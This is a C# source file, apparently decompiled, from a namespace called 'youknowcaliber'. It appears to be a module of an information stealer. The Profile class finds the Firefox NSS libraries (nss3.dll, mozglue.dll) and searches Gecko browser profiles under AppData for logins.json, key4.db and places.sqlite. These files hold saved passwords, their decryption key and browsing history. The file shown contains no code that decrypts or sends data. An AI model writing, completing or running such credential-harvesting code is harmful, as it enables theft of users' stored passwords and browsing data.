﻿using System;
using System.Collections.Generic;
using System.IO;

namespace youknowcaliber
{
	internal class Profile
	{
		private static string[] Concat(string[] x, string[] y)
		{
			bool flag = x == null;
			if (flag)
			{
				throw new ArgumentNullException("x");
			}
			bool flag2 = y == null;
			if (flag2)
			{
				throw new ArgumentNullException("y");
			}
			int destinationIndex = x.Length;
			Array.Resize<string>(ref x, x.Length + y.Length);
			Array.Copy(y, 0, x, destinationIndex, y.Length);
			return x;
		}

		private static string[] ProgramFilesChildren()
		{
			string[] array = Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles"));
			bool flag = 8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
			if (flag)
			{
				array = Profile.Concat(array, Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
			}
			return array;
		}

		public static string GetProfile(string path)
		{
			try
			{
				string path2 = Path.Combine(path, "Profiles");
				bool flag = Directory.Exists(path2);
				if (flag)
				{
					foreach (string text in Directory.GetDirectories(path2))
					{
						bool flag2 = File.Exists(text + "\\logins.json") || File.Exists(text + "\\key4.db") || File.Exists(text + "\\places.sqlite");
						if (flag2)
						{
							return text;
						}
					}
				}
			}
			catch (Exception arg)
			{
				Console.WriteLine("Failed to find profile\n" + arg);
			}
			return null;
		}

		public static string GetMozillaPath()
		{
			foreach (string text in Profile.ProgramFilesChildren())
			{
				bool flag = File.Exists(text + "\\nss3.dll") && File.Exists(text + "\\mozglue.dll");
				if (flag)
				{
					return text;
				}
			}
			return null;
		}

		public static string[] GetMozillaBrowsers()
		{
			List<string> list = new List<string>();
			foreach (string path in Paths.sGeckoBrowserPaths)
			{
				string text = Path.Combine(Paths.appdata, path);
				bool flag = Directory.Exists(text);
				if (flag)
				{
					list.Add(text);
				}
			}
			return list.ToArray();
		}
	}
}
